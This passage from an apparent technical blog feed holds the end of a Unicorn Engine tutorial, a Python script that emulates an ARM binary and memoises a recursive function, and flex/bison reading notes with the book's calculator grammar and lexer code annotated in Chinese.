class="keyword">with</span> open(name) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)</span><br><span class="line"></span><br><span class="line">BASE = <span class="number">0x10000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x300000</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./task4_arm"</span>))</span><br><span class="line"></span><br><span class="line">mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">instructions_skip_list = []</span><br><span class="line"></span><br><span class="line">CCC_START = <span class="number">0x000104D0</span></span><br><span class="line">CCC_END   = <span class="number">0x00010580</span></span><br><span class="line"></span><br><span class="line">stack = []                                          <span class="comment"># Stack for storing the arguments</span></span><br><span class="line">d = &#123;&#125;                                              <span class="comment"># Dictionary that holds return values for given function arguments</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == CCC_START:                        <span class="comment"># Are we at the beginning of ccc function?</span></span><br><span class="line">        arg0 = mu.reg_read(UC_ARM_REG_R0)           <span class="comment"># Read the first argument. it is passed by R0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> arg0 <span class="keyword">in</span> d:                               <span class="comment"># Check whether return value for this function is already saved.</span></span><br><span class="line">            ret = d[arg0]</span><br><span class="line">            mu.reg_write(UC_ARM_REG_R0, ret)        <span class="comment"># Set return value in R0</span></span><br><span class="line">            mu.reg_write(UC_ARM_REG_PC, <span class="number">0x105BC</span>)    <span class="comment"># Set PC to point at "BX LR" instruction. We want to return from fibonacci function</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append(arg0)                      <span class="comment"># If return value is not saved for this argument, add it to stack.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> address == CCC_END:</span><br><span class="line">        arg0 = stack.pop()                          <span class="comment"># We know arguments when exiting the function</span></span><br><span class="line"></span><br><span class="line">        ret = mu.reg_read(UC_ARM_REG_R0)            <span class="comment"># Read the return value (R0)</span></span><br><span class="line">        d[arg0] = ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"></span><br><span class="line">mu.emu_start(<span class="number">0x00010584</span>, <span class="number">0x000105A8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"ret:&#123;0&#125;"</span>.format(mu.reg_read(UC_ARM_REG_R1))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Downloads [15:34:12]</span></span><br><span class="line">$ python task4.py</span><br><span class="line">ret:2635833876</span><br></pre></td></tr></table></figure>
<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05: 参考"></a>0x05: 参考</h4><p><a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">Unicorn Engine tutorial</a></p>
<p><a href="http://blog.csdn.net/ayu_ag/article/details/50734282" target="_blank" rel="noopener">arm平台函数传递参数，反汇编实例分析</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-关于unicorn-engine&quot;&gt;&lt;a href=&quot;#0x00-关于unicorn-engine&quot; class=&quot;headerlink&quot; title=&quot;0x00:关于unicorn engine&quot;&gt;&lt;/a&gt;0x00:关于unicorn engine&lt;/h4&gt;&lt;p&gt;Unicorn Engine是一个模拟器(emulator)，简单的来说就是可以模拟执行程序or片段的代码。对于逆向分析来说很有用，比如分析某个片段的代码的作用；对于漏洞挖掘选手来说，前一段时间的unicorn-afl着实亮眼，不过有带更深入的研究。&lt;/p&gt;
    
    </summary>
    
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="unicorn engine" scheme="http://o0xmuhe.me/tags/unicorn-engine/"/>
    
      <category term="tools" scheme="http://o0xmuhe.me/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>flex_bison读书笔记</title>
    <link href="http://o0xmuhe.me/2018/01/06/flex-bison%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/01/06/flex-bison读书笔记/</id>
    <published>2018-01-06T12:23:17.000Z</published>
    <updated>2018-04-06T08:32:35.950Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00: 起因"></a>0x00: 起因</h4><p>工作上的一些原因需要学习一下。做个记录督促自己读书学习，好好学习。</p>
<a id="more"></a>
<h4 id="0x01-一些概念"><a href="#0x01-一些概念" class="headerlink" title="0x01: 一些概念"></a>0x01: 一些概念</h4><h5 id="语句和表达式"><a href="#语句和表达式" class="headerlink" title="语句和表达式"></a>语句和表达式</h5><ul>
<li>表达式（Expression）有值，而语句（Statement）不总有。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表达式是可以被求值的代码，而语句是一段可执行代码。</span><br><span class="line">因为表达式可被求值，所以它可写在赋值语句等号的右侧。</span><br><span class="line">而语句不一定有值，所以像import、for和break等语句就不能被用于赋值。</span><br><span class="line">Python的语句分为两大类：简单和复合语句。</span><br><span class="line">简单语句是指一逻辑行的代码。例如表达式语句、赋值语句和return语句等。</span><br><span class="line">复合语句是指包含、影响或控制一组语句的代码。例如if、try和class语句等。</span><br><span class="line">表达式本身可以作为表达式语句，也能作为赋值语句的右值或if语句的条件等，所以表达式可以作为语句的组成部分，但不是必须成分（例如continue语句）。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="左递归"><a href="#左递归" class="headerlink" title="左递归"></a>左递归</h5><pre><code>一个文法是左递归的，若我们可以找出其中存在某非终端符号A，最终会推导出来的句型(sentential form)里面包含以自己为最左符号(left-symbol)的句型
</code></pre><ol>
<li>直接左递归</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expr ----&gt; Expr + Term</span><br></pre></td></tr></table></figure>
<p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Aa|C</span><br></pre></td></tr></table></figure>
<ol>
<li>间接左递归</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Ba|C</span><br><span class="line">B ---&gt; Ab|D</span><br></pre></td></tr></table></figure>
<p>这种会产生：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A ---&gt; Ba ---&gt; Aba ---&gt; ...</span><br></pre></td></tr></table></figure></p>
<h4 id="0x02-高级计算器的实现"><a href="#0x02-高级计算器的实现" class="headerlink" title="0x02: 高级计算器的实现"></a>0x02: 高级计算器的实现</h4><h5 id="先看语法分析的部分："><a href="#先看语法分析的部分：" class="headerlink" title="先看语法分析的部分："></a>先看语法分析的部分：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.</span>y</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.y,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* calculator with AST */</span></span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%<span class="keyword">union</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> ast *a;</span><br><span class="line">  <span class="keyword">double</span> d;</span><br><span class="line">  <span class="keyword">struct</span> symbol *s;        <span class="comment">/* which symbol */</span></span><br><span class="line">  <span class="keyword">struct</span> symlist *sl;</span><br><span class="line">  <span class="keyword">int</span> fn;            <span class="comment">/* which function */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* declare tokens */</span> 表明类型</span><br><span class="line">%token &lt;d&gt; NUMBER</span><br><span class="line">%token &lt;s&gt; NAME</span><br><span class="line">%token &lt;fn&gt; FUNC</span><br><span class="line">%token EOL</span><br><span class="line"></span><br><span class="line">%token IF THEN ELSE WHILE DO LET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//right、left表明了结合顺序，即优先级</span></span><br><span class="line">%nonassoc &lt;fn&gt; CMP</span><br><span class="line">%right <span class="string">'='</span></span><br><span class="line">%left <span class="string">'+'</span> <span class="string">'-'</span></span><br><span class="line">%left <span class="string">'*'</span> <span class="string">'/'</span></span><br><span class="line">%nonassoc <span class="string">'|'</span> UMINUS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//把值&lt;a&gt;赋值给了 stmt list explist 三者</span></span><br><span class="line">%type &lt;a&gt; <span class="built_in">exp</span> stmt <span class="built_in">list</span> explist</span><br><span class="line"><span class="comment">//同理</span></span><br><span class="line">%type &lt;sl&gt; symlist</span><br><span class="line"></span><br><span class="line">%start calclist</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">//语句，调用相对应的方法，生成AST</span></span><br><span class="line">stmt: IF <span class="built_in">exp</span> THEN <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">'I'</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | IF <span class="built_in">exp</span> THEN <span class="built_in">list</span> ELSE <span class="built_in">list</span>  &#123; $$ = newflow(<span class="string">'I'</span>, $<span class="number">2</span>, $<span class="number">4</span>, $<span class="number">6</span>); &#125;</span><br><span class="line">   | WHILE <span class="built_in">exp</span> DO <span class="built_in">list</span>           &#123; $$ = newflow(<span class="string">'W'</span>, $<span class="number">2</span>, $<span class="number">4</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//右递归</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>: <span class="comment">/* nothing */</span> &#123; $$ = <span class="literal">NULL</span>; &#125;</span><br><span class="line">   | stmt <span class="string">';'</span> <span class="built_in">list</span> &#123; <span class="keyword">if</span> ($<span class="number">3</span> == <span class="literal">NULL</span>)</span><br><span class="line">                    $$ = $<span class="number">1</span>;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">            $$ = newast(<span class="string">'L'</span>, $<span class="number">1</span>, $<span class="number">3</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">   ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//表达式的ast构建</span></span><br><span class="line"><span class="built_in">exp</span>: <span class="built_in">exp</span> CMP <span class="built_in">exp</span>          &#123; $$ = newcmp($<span class="number">2</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'+'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'+'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'-'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'-'</span>, $<span class="number">1</span>,$<span class="number">3</span>);&#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'*'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'*'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">'/'</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">'/'</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="string">'|'</span> <span class="built_in">exp</span>              &#123; $$ = newast(<span class="string">'|'</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="string">'('</span> <span class="built_in">exp</span> <span class="string">')'</span>          &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">   | <span class="string">'-'</span> <span class="built_in">exp</span> %prec UMINUS &#123; $$ = newast(<span class="string">'M'</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | NUMBER               &#123; $$ = newnum($<span class="number">1</span>); &#125;</span><br><span class="line">   | FUNC <span class="string">'('</span> explist <span class="string">')'</span> &#123; $$ = newfunc($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME                 &#123; $$ = newref($<span class="number">1</span>); &#125;</span><br><span class="line">   | NAME <span class="string">'='</span> <span class="built_in">exp</span>         &#123; $$ = newasgn($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME <span class="string">'('</span> explist <span class="string">')'</span> &#123; $$ = newcall($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//表达式列表</span></span><br><span class="line">explist: <span class="built_in">exp</span></span><br><span class="line"> | <span class="built_in">exp</span> <span class="string">','</span> explist  &#123; $$ = newast(<span class="string">'L'</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//符号列表，用于函数调用，右递归的</span></span><br><span class="line">symlist: NAME       &#123; $$ = newsymlist($<span class="number">1</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line"> | NAME <span class="string">','</span> symlist &#123; $$ = newsymlist($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算器的顶层规则</span></span><br><span class="line"></span><br><span class="line">calclist: <span class="comment">/* nothing */</span></span><br><span class="line">  | calclist stmt EOL &#123;</span><br><span class="line">    <span class="keyword">if</span>(debug) dumpast($<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"= %4.4g\n&gt; "</span>, eval($<span class="number">2</span>));</span><br><span class="line">     treefree($<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//识别一个函数声明 let xxx() = xxx 这样的</span></span><br><span class="line">  | calclist LET NAME <span class="string">'('</span> symlist <span class="string">')'</span> <span class="string">'='</span> <span class="built_in">list</span> EOL &#123;</span><br><span class="line">                       dodef($<span class="number">3</span>, $<span class="number">5</span>, $<span class="number">8</span>);</span><br><span class="line">                       <span class="built_in">printf</span>(<span class="string">"Defined %s\n&gt; "</span>, $<span class="number">3</span>-&gt;name); &#125;</span><br><span class="line"></span><br><span class="line">  | calclist error EOL &#123; yyerrok; <span class="built_in">printf</span>(<span class="string">"&gt; "</span>); &#125;</span><br><span class="line"> ;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<h5 id="词法分析部分："><a href="#词法分析部分：" class="headerlink" title="词法分析部分："></a>词法分析部分：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.</span>l</span><br><span class="line"><span class="comment">/* Companion source code for "flex &amp; bison", published by O'Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.l,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* recognize tokens for the calculator */</span></span><br><span class="line"></span><br><span class="line">%option noyywrap nodefault yylineno</span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.h"</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">"fb3-2.tab.h"</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* float exponent */</span> 浮点数，e开头，正负，这是指数部分</span><br><span class="line">EXP    ([Ee][-+]?[<span class="number">0</span><span class="number">-9</span>]+)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//操作符单操作数</span></span><br><span class="line">%%</span><br><span class="line"> <span class="comment">/* single character ops */</span></span><br><span class="line"><span class="string">"+"</span> |</span><br><span class="line"><span class="string">"-"</span> |</span><br><span class="line"><span class="string">"*"</span> |</span><br><span class="line"><span class="string">"/"</span> |</span><br><span class="line"><span class="string">"="</span> |</span><br><span class="line"><span class="string">"|"</span> |</span><br><span class="line"><span class="string">","</span> |</span><br><span class="line"><span class="string">";"</span> |</span><br><span class="line"><span class="string">"("</span> |</span><br><span class="line"><span class="string">")"</span>     &#123; <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双操作数操作符</span></span><br><span class="line"> <span class="comment">/* comparison ops */</span></span><br><span class="line"><span class="string">"&gt;"</span>     &#123; yylval.fn = <span class="number">1</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;"</span>     &#123; yylval.fn = <span class="number">2</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;&gt;"</span>    &#123; yylval.fn = <span class="number">3</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"=="</span>    &#123; yylval.fn = <span class="number">4</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&gt;="</span>    &#123; yylval.fn = <span class="number">5</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">"&lt;="</span>    &#123; yylval.fn = <span class="number">6</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关键字</span></span><br><span class="line"> <span class="comment">/* keywords */</span></span><br><span class="line"></span><br><span class="line"><span class="string">"if"</span>    &#123; <span class="keyword">return</span> IF; &#125;</span><br><span class="line"><span class="string">"then"</span>  &#123; <span class="keyword">return</span> THEN; &#125;</span><br><span class="line"><span class="string">"else"</span>  &#123; <span class="keyword">return</span> ELSE; &#125;</span><br><span class="line"><span class="string">"while"</span> &#123; <span class="keyword">return</span> WHILE; &#125;</span><br><span class="line"><span class="string">"do"</span>    &#123; <span class="keyword">return</span> DO; &#125;</span><br><span class="line"><span class="string">"let"</span>   &#123; <span class="keyword">return</span> LET;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内建的一些函数</span></span><br><span class="line"> <span class="comment">/* built in functions */</span></span><br><span class="line"><span class="string">"sqrt"</span>  &#123; yylval.fn = B_sqrt; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"exp"</span>   &#123; yylval.fn = B_exp; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"log"</span>   &#123; yylval.fn = B_log; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">"print"</span> &#123; yylval.fn = B_print; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* debug hack */</span></span><br><span class="line"><span class="string">"debug"</span>[<span class="number">0</span><span class="number">-9</span>]+ &#123; debug = atoi(&amp;yytext[<span class="number">5</span>]); <span class="built_in">printf</span>(<span class="string">"debug set to %d\n"</span>, debug); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明的函数的函数名，字母开头</span></span><br><span class="line"> <span class="comment">/* names */</span></span><br><span class="line">[a-zA-Z][a-zA-Z0<span class="number">-9</span>]*  &#123; yylval.s = lookup(yytext); <span class="keyword">return</span> NAME; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//浮点数</span></span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+<span class="string">"."</span>[<span class="number">0</span><span class="number">-9</span>]*&#123;EXP&#125;? |</span><br><span class="line"><span class="string">"."</span>?[<span class="number">0</span><span class="number">-9</span>]+&#123;EXP&#125;? &#123; yylval.d = atof(yytext); <span class="keyword">return</span> NUMBER; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其他的符号</span></span><br><span class="line"><span class="string">"//"</span>.*</span><br><span class="line">[ \t]   <span class="comment">/* ignore white space */</span></span><br><span class="line">\\\<span class="function">n    <span class="title">printf</span><span class="params">(<span class="string">"c&gt; "</span>)</span></span>; <span class="comment">/* ignore line continuation */</span></span><br><span class="line"><span class="string">"\n"</span>    &#123; <span class="keyword">return</span> EOL; &#125;</span><br><span class="line"></span><br><span class="line">.    &#123; yyerror(<span class="string">"Mystery character %c\n"</span>, *yytext); &#125;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
<h5 id="函数实现，构造ast什么的："><a href="#函数实现，构造ast什么的：" class="headerlink" title="函数实现，构造ast什么的："></a>函数实现，构造ast什么的：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 